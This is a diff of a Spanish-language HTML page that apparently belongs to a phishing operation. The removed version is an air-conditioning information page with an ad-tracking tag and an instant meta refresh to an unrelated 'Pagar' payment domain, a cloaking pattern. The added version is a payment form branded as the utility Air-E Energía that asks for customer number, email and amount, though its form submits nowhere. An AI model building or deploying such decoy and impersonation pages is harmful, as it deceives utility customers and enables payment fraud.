@@ -1,296 +1,152 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta http-equiv="refresh" content="0; URL='https://caribesoolfct.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9'" /> 
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Aire Acondicionado Profesional</title>
+  <title>Pago de Facturas Air-E Energía</title>
   <style>
-    /* Reset y estilo base */
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    /* Fondo animado RGB */
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #c3e0f5, #ffffff);
-      color: #333;
-      line-height: 1.6;
-      min-height: 100vh;
+      margin: 0;
+      height: 100vh;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      padding: 40px 20px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      overflow: hidden;
+      background: linear-gradient(270deg, #0072ff, #00c6ff, #00ff94, #00ff94, #0072ff);
+      background-size: 1000% 1000%;
+      animation: gradientMove 20s ease infinite;
     }
 
-    header {
-      text-align: center;
-      margin-bottom: 50px;
-      animation: fadeInDown 1s ease forwards;
+    @keyframes gradientMove {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
     }
 
-    header h1 {
-      font-size: 3rem;
-      color: #007acc;
-      letter-spacing: 2px;
-      margin-bottom: 10px;
-      text-shadow: 1px 1px 5px rgba(0, 122, 204, 0.5);
-    }
-
-    header p {
-      font-size: 1.2rem;
-      color: #005f99;
-      font-weight: 600;
-    }
-
-    main {
-      max-width: 900px;
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
-      padding: 40px 50px;
-      animation: fadeInUp 1s ease forwards;
-    }
-
-    section {
-      margin-bottom: 40px;
-    }
-
-    section h2 {
-      font-size: 2rem;
-      color: #004a80;
-      margin-bottom: 15px;
-      position: relative;
-      padding-bottom: 8px;
-      border-bottom: 3px solid #007acc;
-      animation: slideInLeft 1s ease forwards;
-    }
-
-    section p {
-      font-size: 1.1rem;
-      margin-bottom: 20px;
-      text-align: justify;
-      animation: fadeIn 1.5s ease forwards;
-    }
-
-    ul {
-      list-style: none;
-      padding-left: 20px;
-      margin-bottom: 20px;
-      animation: fadeIn 1.5s ease forwards;
-    }
-
-    ul li {
-      margin-bottom: 12px;
-      font-size: 1.1rem;
-      position: relative;
-      padding-left: 25px;
-      color: #006bb3;
-      cursor: default;
-    }
-
-    ul li::before {
-      content: "✔";
-      position: absolute;
-      left: 0;
-      color: #00aaff;
-      font-weight: bold;
-      font-size: 1.2rem;
-      top: 0;
-      line-height: 1.2;
-      user-select: none;
-    }
-
-    /* Imagen con animación */
-    .image-container {
-      text-align: center;
-      margin-top: 40px;
-      animation: zoomIn 2s ease forwards;
-    }
-
-    .image-container img {
-      max-width: 100%;
+    /* Tarjeta centrada */
+    .card {
+      background: rgba(255, 255, 255, 0.95);
       border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0, 122, 204, 0.3);
-      transition: transform 0.3s ease;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+      max-width: 400px;
+      width: 90%;
+      padding: 30px 40px;
+      text-align: center;
+      z-index: 10;
+    }
+
+    .card h1 {
+      color: #0072ff;
+      margin-bottom: 15px;
+      font-weight: 700;
+    }
+
+    .card p {
+      font-size: 1.1rem;
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    .card label {
+      display: block;
+      text-align: left;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #0072ff;
+    }
+
+    .card input[type="text"],
+    .card input[type="email"],
+    .card input[type="number"] {
+      width: 100%;
+      padding: 10px 15px;
+      margin-bottom: 20px;
+      border: 2px solid #0072ff;
+      border-radius: 10px;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.3s ease;
+    }
+
+    .card input[type="text"]:focus,
+    .card input[type="email"]:focus,
+    .card input[type="number"]:focus {
+      border-color: #00c6ff;
+    }
+
+    .card button {
+      background: #0072ff;
+      color: white;
+      border: none;
+      padding: 15px 0;
+      width: 100%;
+      font-size: 1.2rem;
+      border-radius: 15px;
       cursor: pointer;
+      font-weight: 700;
+      transition: background 0.3s ease;
     }
 
-    .image-container img:hover {
-      transform: scale(1.05);
+    .card button:hover {
+      background: #005bb5;
     }
 
-    /* Footer */
+    /* Pie de página simple */
     footer {
-      margin-top: 50px;
+      position: fixed;
+      bottom: 15px;
+      width: 100%;
+      text-align: center;
       font-size: 0.9rem;
-      color: #777;
-      animation: fadeIn 2s ease forwards;
-    }
-
-    /* Animaciones */
-    @keyframes fadeInDown {
-      from {
-        opacity: 0;
-        transform: translateY(-40px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(40px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes slideInLeft {
-      from {
-        opacity: 0;
-        transform: translateX(-40px);
-      }
-      to {
-        opacity: 1;
-        transform: translateX(0);
-      }
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-      }
-      to {
-        opacity: 1;
-      }
-    }
-
-    @keyframes zoomIn {
-      from {
-        opacity: 0;
-        transform: scale(0.8);
-      }
-      to {
-        opacity: 1;
-        transform: scale(1);
-      }
+      color: rgba(255, 255, 255, 0.7);
+      font-weight: 500;
+      user-select: none;
+      pointer-events: none;
+      z-index: 1;
     }
 
     /* Responsive */
-    @media (max-width: 768px) {
-      main {
-        padding: 30px 20px;
+    @media (max-width: 480px) {
+      .card {
+        padding: 25px 25px;
       }
-      header h1 {
-        font-size: 2.4rem;
-      }
-      section h2 {
-        font-size: 1.6rem;
-      }
-      section p, ul li {
-        font-size: 1rem;
+      .card h1 {
+        font-size: 1.8rem;
       }
     }
   </style>
 </head>
 <body>
 
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17127011388">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <div class="card" role="main" aria-label="Formulario de pago de factura Air-E Energía">
+    <h1>Pago de Factura Air-E Energía</h1>
+    <p>Ingresa los datos para realizar el pago de tu factura de energía.</p>
 
-  gtag('config', 'AW-17127011388');
-</script>
-  <header>
-    <h1>Aire Acondicionado Profesional</h1>
-    <p>Confort, eficiencia y tecnología para tu espacio</p>
-  </header>
+    <form action="#" method="POST" novalidate>
+      <label for="cliente">Número de Cliente</label>
+      <input type="text" id="cliente" name="cliente" placeholder="Ejemplo: 12345678" required />
 
-  <main>
-    <section>
-      <h2>¿Qué es el aire acondicionado?</h2>
-      <p>
-        El aire acondicionado es un sistema diseñado para controlar la temperatura, humedad, calidad y circulación del aire en espacios cerrados, proporcionando un ambiente confortable para las personas y equipos electrónicos.
-        Utiliza un ciclo de refrigeración para extraer el calor del interior y expulsarlo hacia el exterior, permitiendo mantener temperaturas agradables incluso en los días más calurosos.
-      </p>
-    </section>
+      <label for="email">Correo Electrónico</label>
+      <input type="email" id="email" name="email" placeholder="correo@ejemplo.com" required />
 
-    <section>
-      <h2>Principios de funcionamiento</h2>
-      <p>
-        El funcionamiento básico de un aire acondicionado se basa en el ciclo de refrigeración, que consiste en la circulación de un refrigerante a través de un sistema cerrado que incluye un compresor, condensador, válvula de expansión y evaporador.
-        El refrigerante absorbe el calor del interior al evaporarse y lo libera afuera al condensarse, lo que enfría el aire interior y reduce la humedad relativa, mejorando el confort.
-      </p>
-    </section>
+      <label for="monto">Monto a Pagar (USD)</label>
+      <input type="number" id="monto" name="monto" min="1" step="0.01" placeholder="Ejemplo: 50.00" required />
 
-    <section>
-      <h2>Tipos de sistemas de aire acondicionado</h2>
-      <ul>
-        <li><strong>Aire acondicionado central:</strong> Sistema que distribuye aire frío a múltiples habitaciones a través de ductos.</li>
-        <li><strong>Aire acondicionado tipo split:</strong> Unidad dividida en dos partes: evaporador interior y condensador exterior, ideal para un solo espacio.</li>
-        <li><strong>Aire acondicionado portátil:</strong> Equipo móvil que puede trasladarse fácilmente y no requiere instalación fija.</li>
-        <li><strong>Sistemas inverter:</strong> Tecnología que ajusta la velocidad del compresor para ahorrar energía y mantener temperaturas constantes.</li>
-      </ul>
-    </section>
-
-    <section>
-      <h2>Beneficios del aire acondicionado moderno</h2>
-      <p>
-        Los sistemas actuales incorporan tecnologías avanzadas que permiten un ahorro energético significativo, control de la calidad del aire con filtros especiales, reducción de ruido y un impacto ambiental menor gracias al uso de refrigerantes ecológicos.
-        Además, algunos modelos incluyen funciones inteligentes para ser controlados vía apps móviles y adaptarse a las necesidades del usuario.
-      </p>
-    </section>
-
-    <section>
-      <h2>Mantenimiento y cuidado</h2>
-      <p>
-        Para garantizar el óptimo funcionamiento y prolongar la vida útil de un aire acondicionado, es fundamental realizar mantenimiento periódico, que incluye:
-      </p>
-      <ul>
-        <li>Limpieza o cambio de filtros regularmente para evitar acumulación de polvo y bacterias.</li>
-        <li>Revisión del nivel de refrigerante para evitar fugas y mantener eficiencia.</li>
-        <li>Limpieza de las bobinas del evaporador y condensador para facilitar el intercambio térmico.</li>
-        <li>Comprobar el correcto funcionamiento del termostato y los controles.</li>
-        <li>Revisión y limpieza del sistema de drenaje para evitar obstrucciones y filtraciones.</li>
-      </ul>
-    </section>
-
-    <section>
-      <h2>Impacto ambiental y eficiencia energética</h2>
-      <p>
-        El aire acondicionado puede ser un gran consumidor de energía y puede contribuir al calentamiento global si no se usan refrigerantes adecuados. Por ello, se recomienda:
-      </p>
-      <ul>
-        <li>Optar por sistemas con etiqueta energética alta (A++ o superior).</li>
-        <li>Elegir refrigerantes ecológicos como R-32, que tienen menor potencial de calentamiento global.</li>
-        <li>Usar temporizadores y modos eco para reducir el consumo cuando no se necesita enfriamiento continuo.</li>
-        <li>Mantener el aislamiento térmico adecuado en el espacio para maximizar la eficiencia.</li>
-      </ul>
-      <p>
-        La mejora en la tecnología de aire acondicionado también apunta a sistemas más inteligentes, con sensores que ajustan la temperatura según la ocupación y la temperatura exterior.
-      </p>
-    </section>
-
-    <section class="image-container">
-      <img src="https://cdn.pixabay.com/photo/2017/02/08/14/35/air-conditioner-2040648_1280.jpg" alt="Aire acondicionado moderno" />
-      <figcaption>Ejemplo de aire acondicionado split moderno.</figcaption>
-    </section>
-  </main>
+      <button type="submit">Pagar Ahora</button>
+    </form>
+  </div>
 
   <footer>
-    &copy; 2025 Información sobre aire acondicionado. Todos los derechos reservados.
+    &copy; 2025 Air-E Energía. Todos los derechos reservados.
   </footer>
+
 </body>
 </html>
